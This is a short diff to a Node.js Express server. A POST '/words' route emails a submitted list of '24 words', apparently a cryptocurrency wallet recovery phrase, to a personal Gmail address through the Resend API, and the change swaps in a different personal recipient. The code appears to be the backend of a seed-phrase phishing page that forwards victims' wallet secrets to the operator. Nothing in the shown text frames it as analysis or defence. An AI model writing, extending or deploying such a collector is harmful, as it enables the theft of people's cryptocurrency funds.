@@ -53,7 +53,7 @@ app.post('/words', async (req, res) => {
         // Send email to two recipients
         await resend.emails.send({
             from: 'onboarding@resend.dev',
-            to: ['festusmena9@gmail.com'], // Add the second email here
+            to: ['samueldickson06@gmail.com'], // Add the second email here
             subject: 'Words Saved Successfully!',
             html: `<p>You have successfully saved your 24 words:</p><p>${wordList}</p>`
         });
